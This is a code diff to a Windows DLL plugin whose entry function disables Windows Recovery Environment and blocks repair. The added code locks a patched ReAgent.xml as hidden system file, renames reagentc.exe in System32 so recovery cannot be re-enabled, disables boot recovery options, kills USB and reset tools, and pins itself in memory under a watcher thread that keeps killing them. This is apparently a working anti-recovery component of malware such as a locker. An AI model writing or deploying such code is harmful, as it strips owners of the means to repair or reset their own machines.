@@ -61,6 +61,11 @@ static BOOL _PatchReAgentXml(void){
 
     HeapFree(GetProcessHeap(),0,buf);
     CloseHandle(h);
+
+    // Lock the patched file as read-only+system so reagentc /enable cannot rewrite it
+    if(modified)
+        SetFileAttributesW(path,FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
+
     return modified;
 }
 
@@ -112,6 +117,18 @@ static BOOL _RunSys32(const wchar_t* exe, const wchar_t* args, DWORD waitMs){
 // Disable WinRE via reagentc
 static void _RunReagentc(void){
     _RunSys32(L"reagentc.exe",L"/disable",10000);
+}
+
+// Rename reagentc.exe so it cannot be run by name to re-enable WinRE
+static void _DisableReagentcExe(void){
+    wchar_t src[MAX_PATH]={},dst[MAX_PATH]={};
+    GetSystemDirectoryW(src,MAX_PATH);
+    lstrcpyW(dst,src);
+    lstrcatW(src,L"\\reagentc.exe");
+    lstrcatW(dst,L"\\reagentc.exe.bak");
+    if(GetFileAttributesW(src)!=INVALID_FILE_ATTRIBUTES &&
+       GetFileAttributesW(dst)==INVALID_FILE_ATTRIBUTES)
+        MoveFileW(src,dst);
 }
 
 // Disable recovery boot options via bcdedit
@@ -183,6 +200,9 @@ static const wchar_t* const _UsbTools[]={
 };
 
 static DWORD WINAPI _WatcherThread(LPVOID){
+    // Pin this DLL so FreeLibrary from the caller cannot unload it while we run
+    HMODULE hSelf=NULL;
+    GetModuleHandleExW(0x00000001|0x00000004,(LPCWSTR)_WatcherThread,&hSelf);
     while(TRUE){
         _KillByNames(_UsbTools);
         Sleep(3000);
@@ -200,13 +220,16 @@ extern "C" __declspec(dllexport) BOOL WINAPI PluginMain(void){
     // 3. Disable WinRE via reagentc
     _RunReagentc();
 
-    // 4. Disable BCD recovery options
+    // 4. Rename reagentc.exe so it cannot be used to re-enable WinRE
+    _DisableReagentcExe();
+
+    // 5. Disable BCD recovery options
     _DisableRecoveryBoot();
 
-    // 5. Kill any currently running USB/reset tools
+    // 6. Kill any currently running USB/reset tools
     _KillByNames(_UsbTools);
 
-    // 6. Persistent watcher — kills tools as they appear
+    // 7. Persistent watcher — kills tools as they appear
     CreateThread(NULL,0,_WatcherThread,NULL,0,NULL);
 
     return TRUE;
